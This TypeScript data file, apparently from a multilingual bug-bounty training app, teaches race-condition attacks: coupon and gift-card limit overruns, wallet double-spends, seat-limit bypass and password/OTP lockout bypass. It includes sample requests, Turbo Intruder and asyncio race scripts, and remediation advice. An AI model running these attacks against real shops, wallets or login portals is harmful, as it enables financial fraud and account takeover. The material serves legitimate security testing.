import type { Lang } from "./types";

export interface RaceScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface RaceTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "limit_overrun" | "double_spend" | "auth_lockout" | "registration_race" | "file_quota";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: RaceScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface RacePhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface RaceToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "bash_scanner" | "burp_rules" | "curl_oneliner" | "python_fuzzer";
  code: string;
  language: "bash" | "python" | "json";
  howToUse: Record<Lang, string>;
}

export interface RaceReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP RACE CONDITION & CONCURRENCY TECHNIQUES ──────────────────────────
export const RACE_TECHNIQUES: RaceTechnique[] = [
  {
    id: "promo-coupon-limit-overrun",
    title: {
      en: "Discount Coupon & Promo Code Limit Overrun via Single-Packet Attack",
      simple: "Using a 1-Time Gift Card or Promo Code 20 Times at Once",
      hi: "कूपन और प्रोमो कोड लिमिट ओवररन (1-बार के कूपन को 20 बार इस्तेमाल करना)",
    },
    category: "limit_overrun",
    difficulty: "beginner",
    successRate: "High on E-commerce, SaaS, and Food Delivery applications",
    summary: {
      en: "Web applications prevent reuse of promotional coupons using sequential validation: 1) Read coupon usage from database, 2) If used >= 1, reject, 3) Apply discount, 4) Mark coupon as used (`UPDATE coupons SET used = 1`). When requests arrive concurrently within the same TCP packet via HTTP/2 Single-Packet Attack, 20 to 50 threads execute Step 1 simultaneously before any thread can commit Step 4. An attacker stacking $20 coupons can apply $400 in discounts to purchase merchandise completely free!",
      simple: "A store gives you a $20 discount code that can only be used once. If you click apply 30 times at the exact same millisecond using special tools, the server applies the $20 discount 30 times before it realizes the code is already spent, giving you $600 of free items!",
      hi: "वेबसाइट 1-टाइम प्रोमो कोड को चेक करते समय डेटाबेस में देखती है कि क्या कोड इस्तेमाल हुआ है। अगर हम HTTP/2 सिंगल-पैकेट अटैक के जरिए 30 कूपन रिक्वेस्ट्स एक ही मिलीसेकंड में भेजें, तो डेटाबेस में 'इस्तेमाल हुआ' दर्ज होने से पहले ही 30 बार डिस्काउंट जुड़ जाता है और सामान बिल्कुल फ्री हो जाता है!",
    },
    scenarios: [
      {
        title: {
          en: "Stacking Single-Use $50 Welcome Credit to Reduce Cart to $0",
          simple: "Applying a Single $50 Welcome Voucher 10 Times on a Single Order",
          hi: "एक $50 के वाउचर को 10 बार जोड़कर कार्ट का बिल 0 करना",
        },
        description: {
          en: "Submitting `POST /cart/apply-coupon` with `{\"code\": \"WELCOME50\"}` 15 times concurrently in a single TCP packet results in all 15 requests returning `200 OK: Coupon Applied`. The final checkout total drops from $750 to $0, allowing order completion without payment.",
          simple: "Send the coupon request 15 times concurrently. The system gives you $50 off 15 times, wiping out the entire $750 cart cost.",
          hi: "एक ही पैकेट में 15 बार कूपन रिक्वेस्ट भेजें। सिस्टम 15 बार $50 घटा देता है और बिल शून्य हो जाता है।",
        },
        commandOrRequest: `POST /cart/apply-coupon HTTP/2
Host: shop.target.com
Authorization: Bearer user_jwt_token
Content-Type: application/json

{"cart_id": "cart_9912", "coupon_code": "SAVE50NOW"}`,
        responseSample: `HTTP/2 200 OK
Content-Type: application/json

{"status": "applied", "discount": 50.00, "new_total": 0.00, "message": "Coupon successfully applied!"}`,
        impact: {
          en: "Critical (P1): Direct financial loss for the business through free merchandise acquisition and balance manipulation.",
          simple: "Free items and direct financial theft from the store.",
          hi: "कंपनी को सीधा वित्तीय नुकसान और बिना पैसे दिए फ्री में सामान खरीदना।",
        },
      },
      {
        title: {
          en: "Gift Card Balance Redemption Multi-Drain",
          simple: "Redeeming a $100 Gift Card into Multiple Accounts Simultaneously",
          hi: "$100 के गिफ्ट कार्ड को एक साथ कई अकाउंट्स में लोड करना",
        },
        description: {
          en: "Redeeming a gift card code across 10 browser sessions concurrently allows claiming the full $100 balance into each of the 10 accounts ($1,000 total credit generated from a single $100 card).",
          simple: "Type the gift card code into 10 accounts and hit redeem at the exact same millisecond. All 10 accounts get the money!",
          hi: "10 अलग-अलग अकाउंट्स से एक साथ गिफ्ट कार्ड रिडीम करें। सभी 10 अकाउंट्स में पैसे क्रेडिट हो जाते हैं।",
        },
        commandOrRequest: `POST /api/wallet/redeem-giftcard HTTP/2
Host: target.com
Content-Type: application/json

{"card_pin": "GC-8491-9923-0194"}`,
        responseSample: `HTTP/2 200 OK
Content-Type: application/json

{"success": true, "credited_amount": 100.00, "new_wallet_balance": 100.00}`,
        impact: {
          en: "Critical (P1): Arbitrary money creation and multi-account balance fraud.",
          simple: "Creates free money out of thin air.",
          hi: "हवा में से अनगिनत पैसे बनाना और वॉलेट में नकली बैलेंस जोड़ना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "In Burp Suite, capture the request that applies a coupon or redeems a gift card.",
        simple: "Capture the coupon apply request in Burp Suite.",
        hi: "कूपन लगाने वाली रिक्वेस्ट को Burp Suite में कैप्चर करें।",
      },
      {
        en: "Send the request to Burp Repeater, duplicate it into a tab group containing 20 identical requests.",
        simple: "Duplicate the request 20 times in Burp Repeater tabs.",
        hi: "Burp Repeater में इस रिक्वेस्ट की 20 कॉपीज बनाएं।",
      },
      {
        en: "Right-click the Send button in Repeater and select 'Send group in parallel (single-packet attack)'.",
        simple: "Right-click Send and choose 'Send group in parallel'.",
        hi: "Send बटन पर राइट क्लिक करके 'Send group in parallel' चुनें।",
      },
      {
        en: "Inspect responses: if more than one request returns `200 OK` or the cart discount multiplied, you have discovered a Critical Race Condition!",
        simple: "If multiple tabs show 200 OK and give extra discounts, you found a bounty!",
        hi: "अगर एक से ज्यादा टैब्स में 200 OK और एक्स्ट्रा डिस्काउंट मिले, तो P1 बग पक्का है!",
      },
    ],
    burpOrToolRule: [
      "Burp Suite Repeater: 'Send group in parallel (single-packet attack)'",
      "Turbo Intruder: engine.openGate('race1') with Engine.BURP2",
    ],
    hunterProTip: {
      en: "Always warm up the connection first! Send 1 or 2 harmless GET requests (`GET /robots.txt`) over the HTTP/2 connection immediately before releasing the single-packet gate. This establishes TLS handshake and avoids connection setup latency during the race window!",
      simple: "Warm up the connection by requesting /robots.txt right before the attack for maximum speed!",
      hi: "अटैक से ठीक पहले एक सामान्य GET रिक्वेस्ट भेजकर कनेक्शन वॉर्म-अप करें ताकि मिलीसेकंड की भी देरी न हो!",
    },
  },
  {
    id: "wallet-double-spend-concurrency",
    title: {
      en: "Fintech Wallet Balance Double-Spend & Transfer Race",
      simple: "Sending the Same Money to Two Different People at the Same Time",
      hi: "वॉलेट डबल-स्पेंड रेस (एक ही बैलेंस को एक साथ दो जगह ट्रांसफर करना)",
    },
    category: "double_spend",
    difficulty: "intermediate",
    successRate: "Medium to High on microservice and non-locking SQL architectures",
    summary: {
      en: "A Double-Spend race condition occurs when an application processes multiple balance withdrawal or transfer requests concurrently without transactional row-level database locking (`SELECT FOR UPDATE`). If User A has $100 and sends two concurrent requests transferring $100 to User B and $100 to User C within the same execution window, both threads verify `$balance >= 100` before either deduction completes, resulting in $200 being transferred out from a $100 account balance.",
      simple: "You have $100 in your wallet. You send $100 to your friend and $100 to your second account at the exact same microsecond. The server checks your balance for both at once and sends $200 total, leaving your balance at $0 or negative!",
      hi: "आपके पास वॉलेट में ₹100 हैं। आप एक ही मिलीसेकंड में ₹100 अपने दोस्त को और ₹100 अपने दूसरे खाते में भेजते हैं। सर्वर दोनों रिक्वेस्ट्स को एक साथ पास कर देता है और आपके ₹100 से कुल ₹200 बाहर निकल जाते हैं!",
    },
    scenarios: [
      {
        title: {
          en: "Concurrent P2P Money Transfer Yielding Negative Balance",
          simple: "Draining More Funds Than Available via Parallel Wire Requests",
          hi: "मौजूद बैलेंस से ज्यादा पैसे एक साथ ट्रांसफर करना",
        },
        description: {
          en: "Account holds a balance of $50. By submitting two parallel `POST /api/wallet/transfer` requests sending $50 each to two different recipients, both transfers succeed. Recipients receive $100 combined, while the sender account drops to -$50 without authorization.",
          simple: "With $50 in your wallet, send $50 twice concurrently. Both friends get $50, creating $50 of free money.",
          hi: "₹50 के बैलेंस से दो बार ₹50 ट्रांसफर करें। दोनों रिसीवर्स को पैसे मिल जाते हैं और बैंक में नेगेटिव बैलेंस हो जाता है।",
        },
        commandOrRequest: `POST /api/v1/transfer HTTP/2
Host: pay.target.com
Authorization: Bearer victim_token
Content-Type: application/json

{"recipient_id": "ACC_9921", "amount": 50.00, "currency": "USD"}`,
        responseSample: `HTTP/2 200 OK
Content-Type: application/json

{"status": "transferred", "transaction_id": "TXN_881923", "amount": 50.00}`,
        impact: {
          en: "Critical (P1): Direct financial balance inflation and unauthorized fund withdrawal.",
          simple: "Direct financial theft by doubling transfer balances.",
          hi: "सीधी वित्तीय चोरी और कंपनी के पैसे का अनधिकृत ट्रांसफर।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Set up two recipient accounts: Recipient 1 and Recipient 2.",
        simple: "Create two test accounts to receive the money.",
        hi: "पैसे रिसीव करने के लिए दो अलग-अलग टेस्ट अकाउंट्स बनाएं।",
      },
      {
        en: "Prepare two transfer requests in Burp Repeater: Request A sending remaining balance to Recipient 1, Request B sending to Recipient 2.",
        simple: "Set up two transfer requests in Burp Repeater.",
        hi: "Burp Repeater में दोनों ट्रांसफर रिक्वेस्ट्स तैयार करें।",
      },
      {
        en: "Group both requests in a tab group and execute 'Send group in parallel (single-packet attack)'.",
        simple: "Send both transfer requests together in parallel.",
        hi: "दोनों रिक्वेस्ट्स को सिंगल-पैकेट अटैक से एक साथ भेजें।",
      },
      {
        en: "Verify the wallet balances on all accounts: if both transfers completed successfully, double-spend is verified!",
        simple: "Check if both recipients got the money. If yes, you found a critical P1 bug!",
        hi: "जांचें कि क्या दोनों अकाउंट्स में पैसे पहुंच गए। अगर हाँ, तो P1 डबल-स्पेंड बग मौजूद है!",
      },
    ],
    burpOrToolRule: [
      "Turbo Intruder: concurrentConnections=1, requestsPerConnection=2, gate='transfer_race'",
      "Verify database locking: absence of '409 Conflict' or 'Lock wait timeout' indicates vulnerability",
    ],
    hunterProTip: {
      en: "Target currency conversions! Converting $100 USD to EUR and simultaneously requesting a refund or cancellation in a second tab frequently desynchronizes currency exchange balances!",
      simple: "Try currency exchange tabs! Changing dollars to euros and clicking cancel at the same time often confuses the math.",
      hi: "करेंसी कन्वर्जन पर टेस्ट करें! डॉलर को यूरो में बदलते समय एक साथ कैंसिल बटन दबाने से बैलेंस गड़बड़ा जाता है!",
    },
  },
  {
    id: "pre-auth-registration-and-invitation-race",
    title: {
      en: "Pre-Auth Registration & Organization Invite Quota Race",
      simple: "Adding Unlimited Team Members Beyond Paid Plan Limits",
      hi: "ऑर्गनाइज़ेशन इनवाइट और रजिस्ट्रेशन रेस (पेड प्लान लिमिट्स को तोड़ना)",
    },
    category: "registration_race",
    difficulty: "beginner",
    successRate: "High on B2B SaaS platforms with seat-based billing",
    summary: {
      en: "SaaS platforms enforce seat limits (e.g. Free Tier allows maximum 3 team members). When the owner invites new users via `POST /api/team/invite`, the server checks `if (current_seats < max_seats)`. Sending 20 concurrent invite requests allows adding 20 active members to a 3-seat workspace, bypassing enterprise subscription tiers completely without paying for additional seat licenses.",
      simple: "A free plan only allows 3 team members. By firing 20 invite emails at the exact same millisecond, you can add 20 coworkers to your team for free, bypassing the company's $500/month Enterprise plan!",
      hi: "फ्री प्लान में केवल 3 सदस्यों को जोड़ने की अनुमति होती है। अगर आप 20 इनवाइट रिक्वेस्ट एक साथ भेजें, तो 3-सीट की लिमिट टूट जाती है और 20 लोग बिना पैसे दिए एंटरप्राइज फीचर्स इस्तेमाल कर सकते हैं!",
    },
    scenarios: [
      {
        title: {
          en: "Seat-Limit Bypass on Business Organization Workspaces",
          simple: "Inviting 50 Users onto a 3-Seat Free Plan",
          hi: "3-सीट वाले फ्री प्लान पर 50 मेंबर्स को इनवाइट करना",
        },
        description: {
          en: "Free tier workspace permits only 3 users. Concurrently sending 30 invite requests with unique email addresses allows all 30 invitations to be accepted, populating the organization with 30 members without billing upgrades.",
          simple: "Send 30 invites in parallel to bypass the 3-seat restriction completely.",
          hi: "30 इनवाइट्स एक साथ भेजकर 3-सीट का प्रतिबंध पूरी तरह खत्म कर देना।",
        },
        commandOrRequest: `POST /api/v1/organization/invitations HTTP/2
Host: app.target.com
Authorization: Bearer org_admin_token
Content-Type: application/json

{"email": "coworker_%s@company.com", "role": "member"}`,
        responseSample: `HTTP/2 201 Created
Content-Type: application/json

{"status": "invited", "team_size": 25, "plan": "free_tier"}`,
        impact: {
          en: "High / Business Logic: Circumvention of SaaS monetization and seat-based licensing restrictions.",
          simple: "Steals enterprise features without paying.",
          hi: "कंपनी के पेड प्लान्स और सब्सक्रिप्शन मॉडल को बायपास करना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Create a workspace on the free tier that has reached its maximum seat capacity (e.g. 2/2 seats used).",
        simple: "Fill up all the free slots on your test workspace.",
        hi: "अपने फ्री वर्कस्पेस की सारी सीट्स भर लें।",
      },
      {
        en: "Prepare an invite request in Burp Turbo Intruder.",
        simple: "Send the invite request to Turbo Intruder.",
        hi: "इनवाइट रिक्वेस्ट को Turbo Intruder में खोलें।",
      },
      {
        en: "Queue 20 invite requests with randomized email addresses behind a single-packet gate.",
        simple: "Queue 20 invites with different emails behind the race gate.",
        hi: "अलग-अलग ईमेल्स के साथ 20 रिक्वेस्ट्स कतार में लगाएं।",
      },
      {
        en: "Release gate and verify workspace membership: if member count exceeds plan limit, the vulnerability is confirmed!",
        simple: "Fire the requests and check if your member count went over the limit!",
        hi: "रिक्वेस्ट्स भेजें और देखें कि क्या टीम मेंबर्स की संख्या लिमिट से ज्यादा हो गई!",
      },
    ],
    burpOrToolRule: [
      "Turbo Intruder: concurrentConnections=1, Engine.BURP2, gate='invite_race'",
    ],
    hunterProTip: {
      en: "Test file upload quotas too! If a free user is limited to 100MB of storage or 5 file uploads, sending 20 concurrent large file uploads frequently bypasses storage quotas by tens of gigabytes!",
      simple: "Try this on file storage limits too! You can often upload 10x more storage than allowed.",
      hi: "फाइल अपलोड कोटा पर भी टेस्ट करें! 5 फाइल्स की लिमिट होने पर 20 फाइल्स एक साथ भेजने से स्टोरेज लिमिट बायपास हो जाती है!",
    },
  },
  {
    id: "anti-brute-force-rate-limit-collision",
    title: {
      en: "Bypassing 3-Attempt Password & 2FA Lockouts via Concurrency Collision",
      simple: "Testing 50 Passwords or OTPs at Once Before the Server Can Lock You Out",
      hi: "अकाउंट लॉकआउट होने से पहले एक साथ 50 पासवर्ड या OTP टेस्ट करना",
    },
    category: "auth_lockout",
    difficulty: "intermediate",
    successRate: "High on apps tracking failed attempts in relational databases",
    summary: {
      en: "Web applications lock accounts or block IPs after 3 to 5 failed login/OTP attempts (`attempts_count >= 5`). Because reading the attempt counter and incrementing it is not an atomic operation, synchronizing 40 to 60 guess requests in a single HTTP/2 packet ensures that all 60 requests enter the verification routine before the counter hits 5. This increases brute-force efficiency by over 1,000% against rate-limited authentication portals.",
      simple: "The website says 'You only get 3 tries before your account is locked for 1 hour!'. If you send 50 guesses in the exact same millisecond, all 50 guesses get checked before the server can lock the door!",
      hi: "वेबसाइट 3 गलत प्रयासों के बाद 1 घंटे के लिए अकाउंट लॉक कर देती है। लेकिन अगर आप 50 गेस एक ही मिलीसेकंड में भेजें, तो सर्वर के लॉक करने से पहले ही सभी 50 पासवर्ड्स टेस्ट हो जाते हैं!",
    },
    scenarios: [
      {
        title: {
          en: "Single-Packet Password Spraying within a 3-Attempt Lockout Window",
          simple: "Trying 50 Common Passwords in 1 Millisecond Without Triggering Lockout",
          hi: "बिना लॉक हुए 1 मिलीसेकंड में 50 पासवर्ड्स जांचना",
        },
        description: {
          en: "An enterprise SSO login endpoint locks the user account on the 4th failed attempt. By delivering 50 password guesses synchronized in a single packet, all 50 return `401 Unauthorized` without triggering the `423 Locked` state.",
          simple: "Send 50 passwords at once. The server checks all 50 without locking you out.",
          hi: "एक साथ 50 पासवर्ड्स भेजें। सर्वर अकाउंट लॉक किए बिना सभी 50 को चेक कर लेता है।",
        },
        commandOrRequest: `POST /api/v1/auth/login HTTP/2
Host: sso.target.com
Content-Type: application/json

{"username": "admin@target.com", "password": "%s"}`,
        responseSample: `HTTP/2 401 Unauthorized
Content-Type: application/json

{"error": "Invalid credentials", "remaining_attempts": 3}`,
        impact: {
          en: "High / Critical: Circumvents brute-force defense mechanisms; enables credential stuffing on sensitive accounts.",
          simple: "Lets hackers guess passwords despite lockout protections.",
          hi: "पासवर्ड लॉकआउट सुरक्षा को दरकिनार करके अकाउंट हैक करना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Determine lockout policy by sending sequential failed requests (e.g. locks at 3 attempts).",
        simple: "Check how many wrong tries cause an account lockout.",
        hi: "लगातार गलत पासवर्ड डालकर देखें कि सर्वर कितने प्रयासों पर लॉक करता है।",
      },
      {
        en: "Configure Turbo Intruder with the single-packet race template.",
        simple: "Open Turbo Intruder in Burp Suite.",
        hi: "Turbo Intruder में सिंगल-पैकेट टेम्पलेट लोड करें।",
      },
      {
        en: "Queue 30-50 different password guesses and release through a synchronized gate.",
        simple: "Queue 30 passwords and release them all at once.",
        hi: "30 पासवर्ड्स कतार में लगाएं और एक साथ फायर करें।",
      },
      {
        en: "If all 50 return 401 instead of 423 Locked, the anti-brute-force mechanism is vulnerable to race collision!",
        simple: "If all 50 get tested without a lockout, the race condition works!",
        hi: "अगर बिना लॉक हुए सभी 50 टेस्ट हो जाते हैं, तो रेस कंडीशन बग मौजूद है!",
      },
    ],
    burpOrToolRule: [
      "Turbo Intruder: concurrentConnections=1, requestsPerConnection=50, gate='auth_race'",
    ],
    hunterProTip: {
      en: "Combine with X-Forwarded-For! If the server enforces both an account-level attempt limit AND an IP rate limit, combine single-packet attacks with IP header rotation to defeat both layers simultaneously!",
      simple: "Combine this with fake IP headers to bypass both account lockouts and IP bans at once!",
      hi: "इसे नकली IP हेडर के साथ मिलाकर चलाएं ताकि अकाउंट लॉक और IP ब्लॉक दोनों एक साथ बायपास हो जाएं!",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY FOR CONCURRENCY ATTACKS ───────────────────────────
export const RACE_METHODOLOGY_PHASES: RacePhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: Identifying Race Candidates & State Transitions",
      simple: "Phase 1: Finding Features Where Money or Limits Are Checked",
      hi: "चरण 1: रेस कंडीशन के संभावित एंडपॉइंट्स की पहचान",
    },
    objective: {
      en: "Map out application endpoints involving state transitions: balance deductions, one-time token consumptions, seat allocations, and promo discounts.",
      simple: "Look for buttons that spend money, use coupons, or change quotas.",
      hi: "ऐसे फीचर्स खोजें जहाँ बैलेंस कटता हो, कूपन लगता हो या लिमिट चेक होती हो।",
    },
    steps: [
      {
        en: "Look for any action with a quantitative limit (e.g. 'Only 1 coupon per order', 'Max 3 invites').",
        simple: "Look for anything that says 'only once' or has a number limit.",
        hi: "ऐसे फीचर्स देखें जहाँ 'सिर्फ 1 बार' या संख्या की सीमा तय हो।",
      },
      {
        en: "Identify endpoints involving database write operations after a read check (`if allowed: update()`).",
        simple: "Find endpoints that check a condition before saving data.",
        hi: "ऐसे एंडपॉइंट्स देखें जो पहले जांच करते हैं और फिर डेटा सेव करते हैं।",
      },
      {
        en: "Verify HTTP/2 protocol support: inspect if the server supports ALPN `h2` multiplexing.",
        simple: "Check if the server supports fast HTTP/2 connections.",
        hi: "जांचें कि क्या सर्वर HTTP/2 प्रोटोकॉल को सपोर्ट करता है।",
      },
    ],
    commandsOrPayloads: [
      `curl -I --http2 https://target.com/ | grep -i 'HTTP/2'`,
    ],
    keyTargets: [
      "Coupon and gift card redemption",
      "Wallet transfers and withdrawal APIs",
      "Team invites and storage allocations",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: Connection Warm-Up & Pipeline Preparation",
      simple: "Phase 2: Warming Up the Network Connection for Maximum Speed",
      hi: "चरण 2: नेटवर्क कनेक्शन वॉर्म-अप और पाइपलाइनिंग",
    },
    objective: {
      en: "Pre-establish TCP and TLS handshake sessions so network negotiation latency does not desynchronize packet arrival.",
      simple: "Send a harmless request first so the connection is already hot and ready.",
      hi: "अटैक से पहले कनेक्शन को तैयार रखें ताकि कोई देरी न हो।",
    },
    steps: [
      {
        en: "Send 2 benign requests (e.g. `GET /favicon.ico`) over the target HTTP/2 connection.",
        simple: "Request the website icon first to open the connection.",
        hi: "कनेक्शन खोलने के लिए पहले एक सामान्य आइकन रिक्वेस्ट भेजें।",
      },
      {
        en: "Ensure all parallel streams share the exact same TCP socket and multiplexed stream IDs.",
        simple: "Make sure all attack requests use the same open pipe.",
        hi: "सुनिश्चित करें कि सभी रिक्वेस्ट्स एक ही खुले पाइप से जाएं।",
      },
    ],
    commandsOrPayloads: [
      `GET /favicon.ico HTTP/2`,
    ],
    keyTargets: [
      "HTTP/2 multiplexed streams",
      "TCP handshake latency elimination",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Single-Packet Attack Execution (Burp Repeater & Turbo Intruder)",
      simple: "Phase 3: Firing 30 Requests in the Exact Same Millisecond",
      hi: "चरण 3: सिंगल-पैकेट अटैक एग्जीक्यूशन (एक ही पल में 30 रिक्वेस्ट्स)",
    },
    objective: {
      en: "Synchronize 20 to 50 concurrent requests so their final bytes are transmitted in a single TCP packet, minimizing the race window to sub-millisecond precision.",
      simple: "Hold all requests behind a gate and release them all at the exact same instant.",
      hi: "सभी रिक्वेस्ट्स को एक गेट के पीछे रोकें और एक ही मिलीसेकंड में छोड़ें।",
    },
    steps: [
      {
        en: "In Burp Repeater: Create a Tab Group containing 20-30 copies of the target request.",
        simple: "Make 20 tabs in Burp Repeater.",
        hi: "Burp Repeater में 20 टैब्स बनाएं।",
      },
      {
        en: "Select 'Send group in parallel (single-packet attack)'.",
        simple: "Click 'Send group in parallel'.",
        hi: "'Send group in parallel' पर क्लिक करें।",
      },
      {
        en: "Inspect arrival timestamps in response headers: verify sub-5ms spread.",
        simple: "Check that all responses arrived at the exact same millisecond.",
        hi: "जांचें कि क्या सभी रिस्पॉन्स एक ही समय पर आए।",
      },
    ],
    commandsOrPayloads: [
      `Repeater -> Send group in parallel (single-packet attack)`,
      `engine.openGate('race')`,
    ],
    keyTargets: [
      "Single-Packet byte synchronization",
      "Sub-millisecond execution window",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: State Corruption & Impact Validation",
      simple: "Phase 4: Checking If the Balance or Limit Got Broken",
      hi: "चरण 4: स्टेट करप्शन और वित्तीय प्रभाव की पुष्टि",
    },
    objective: {
      en: "Verify whether database state reflects unauthorized limit overruns, duplicate credits, or negative balances.",
      simple: "Check your account to see if you got extra money or free items.",
      hi: "अकाउंट में जाकर देखें कि क्या एक्स्ट्रा बैलेंस या फ्री डिस्काउंट मिल गया।",
    },
    steps: [
      {
        en: "Query the cart or wallet balance API: observe if total discount exceeded maximum allowed.",
        simple: "Check your cart total or wallet balance.",
        hi: "कार्ट टोटल या वॉलेट बैलेंस चेक करें।",
      },
      {
        en: "Take clean screenshots showing before and after states for proof of concept.",
        simple: "Take before and after screenshots for your bug report.",
        hi: "रिपोर्ट के लिए पहले और बाद के स्क्रीनशॉट्स लें।",
      },
    ],
    commandsOrPayloads: [
      `GET /api/v1/cart/summary`,
      `GET /api/v1/wallet/balance`,
    ],
    keyTargets: [
      "Negative balances",
      "Multiplied discount totals",
      "Quota overruns",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Remediation Advisory & Locking Controls",
      simple: "Phase 5: How Companies Must Fix the Race Condition",
      hi: "चरण 5: समाधान और डेटाबेस लॉकिंग कंट्रोल्स",
    },
    objective: {
      en: "Provide actionable remediation guidance including row-level locking, atomic transactions, and distributed mutexes.",
      simple: "Tell the company how to lock the database so requests wait in line one by one.",
      hi: "कंपनी को बताएं कि डेटाबेस में रो-लेवल लॉकिंग कैसे लगाएं ताकि रिक्वेस्ट्स लाइन में प्रोसेस हों।",
    },
    steps: [
      {
        en: "Advise implementing database row-level locking: `SELECT ... FOR UPDATE`.",
        simple: "Use database locks so only one request can touch the balance at a time.",
        hi: "डेटाबेस में `SELECT ... FOR UPDATE` लॉकिंग का सुझाव दें।",
      },
      {
        en: "Advise using atomic increments: `UPDATE wallet SET balance = balance - 100 WHERE balance >= 100`.",
        simple: "Use atomic database updates.",
        hi: "एटॉमिक डेटाबेस अपडेट्स का उपयोग करें।",
      },
      {
        en: "Advise using distributed locks (Redis Redlock) across microservice clusters.",
        simple: "Use Redis locks across server clusters.",
        hi: "माइक्रोसर्विसेज में Redis Redlock का उपयोग करें।",
      },
    ],
    commandsOrPayloads: [
      `SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;`,
    ],
    keyTargets: [
      "SQL SELECT FOR UPDATE",
      "Redis distributed locks (Redlock)",
      "Idempotency keys on financial APIs",
    ],
  },
];

// ─── 3. AUTOMATION SCRIPTS & TOOLS STASH ──────────────────────────────────────
export const RACE_TOOLS_STASH: RaceToolSnippet[] = [
  {
    id: "turbo-intruder-single-packet-template",
    title: {
      en: "Turbo Intruder HTTP/2 Single-Packet Attack Template",
      simple: "Python Script for Burp Turbo Intruder to Launch 30 Synchronized Requests",
      hi: "Turbo Intruder HTTP/2 सिंगल-पैकेट अटैक स्क्रिप्ट",
    },
    description: {
      en: "The industry-standard Turbo Intruder script developed for HTTP/2 Single-Packet Attacks. Holds all requests behind a gate and releases their final bytes simultaneously in a single TCP frame.",
      simple: "The official script for Burp Turbo Intruder to fire 30 requests at the exact same microsecond.",
      hi: "Burp Turbo Intruder की यह स्क्रिप्ट 30 रिक्वेस्ट्स को एक साथ रोककर एक ही TCP पैकेट में फायर करती है।",
    },
    category: "burp_rules",
    language: "python",
    code: `def queueRequests(target, wordlists):
    # Initialize HTTP/2 single-connection engine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2,
                           requestsPerConnection=100,
                           pipeline=False)

    # 1. Warm-up request to pre-establish TLS & connection pipeline
    engine.queue(target.req, gate='warmup')
    engine.openGate('warmup')

    # 2. Queue 30 identical requests behind the synchronized race gate
    for i in range(30):
        engine.queue(target.req, gate='race_gate')

    # 3. Release all 30 requests simultaneously in a single TCP packet!
    engine.openGate('race_gate')

def handleResponse(req, category):
    # Highlight successful or non-standard responses
    if req.status == 200 or req.status == 201:
        table.add(req)`,
    howToUse: {
      en: "In Burp Suite: Send target request to Turbo Intruder -> Paste script -> Click 'Attack' -> Watch multiple 200 OK responses arrive simultaneously.",
      simple: "Paste into Turbo Intruder in Burp Suite and click Attack.",
      hi: "Burp Turbo Intruder में पेस्ट करें और Attack बटन दबाएं।",
    },
  },
  {
    id: "asyncio-parallel-race-runner",
    title: {
      en: "Python Asyncio Concurrent HTTP/2 Race Runner",
      simple: "Standalone Python Script to Test Race Conditions Without Burp Pro",
      hi: "पायथन Asyncio समानांतर रेस कंडीशन टूल (बिना Burp Pro के)",
    },
    description: {
      en: "Standalone Python script utilizing `httpx` with HTTP/2 support to fire 25 parallel requests simultaneously using asynchronous coroutines.",
      simple: "A Python tool that sends 25 requests at the exact same moment without needing Burp Suite Pro.",
      hi: "यह पायथन टूल बिना Burp Pro के भी 25 रिक्वेस्ट्स को एक साथ समानांतर रूप से फायर करता है।",
    },
    category: "python_fuzzer",
    language: "python",
    code: `#!/usr/bin/env python3
"""
Standalone Python HTTP/2 Concurrent Race Runner
Fires 25 parallel requests using asyncio and httpx.
"""

import sys
import asyncio
import httpx

async def send_race_request(client, url, headers, data, req_id):
    try:
        response = await client.post(url, headers=headers, json=data, timeout=10.0)
        print(f"[*] Request #{req_id:02d} -> Status: {response.status_code} | Body: {response.text[:80]}")
        return response.status_code
    except Exception as e:
        print(f"[!] Request #{req_id:02d} Error: {e}")
        return 0

async def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_url> <bearer_token>")
        print(f"Example: {sys.argv[0]} https://target.com/api/coupon 'token123'")
        sys.exit(1)

    url = sys.argv[1]
    token = sys.argv[2]
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "RaceConditionAudit/1.0"
    }
    
    payload = {"coupon_code": "PROMO2026"}

    print(f"[*] Target: {url}")
    print("[*] Spawning 25 concurrent coroutines via HTTP/2...\\n")

    # Use HTTP/2 enabled async client
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        # Pre-warm connection
        await client.get(url, timeout=5.0)
        
        # Fire 25 requests simultaneously
        tasks = [send_race_request(client, url, headers, payload, i) for i in range(1, 26)]
        results = await asyncio.gather(*tasks)

    success_count = sum(1 for s in results if s in [200, 201])
    print(f"\\n[*] Completed. Successful responses (200/201): {success_count} / 25")
    if success_count > 1:
        print("\\033[1;32m[+] CRITICAL RACE CONDITION DETECTED! Limit overrun achieved.\\033[0m")
    else:
        print("[-] Normal sequential enforcement observed.")

if __name__ == "__main__":
    asyncio.run(main())`,
    howToUse: {
      en: "Install httpx: `pip install httpx[http2]` and run: `python3 race_runner.py https://target.com/api/coupon 'token'`",
      simple: "Run the script with the coupon link and your token.",
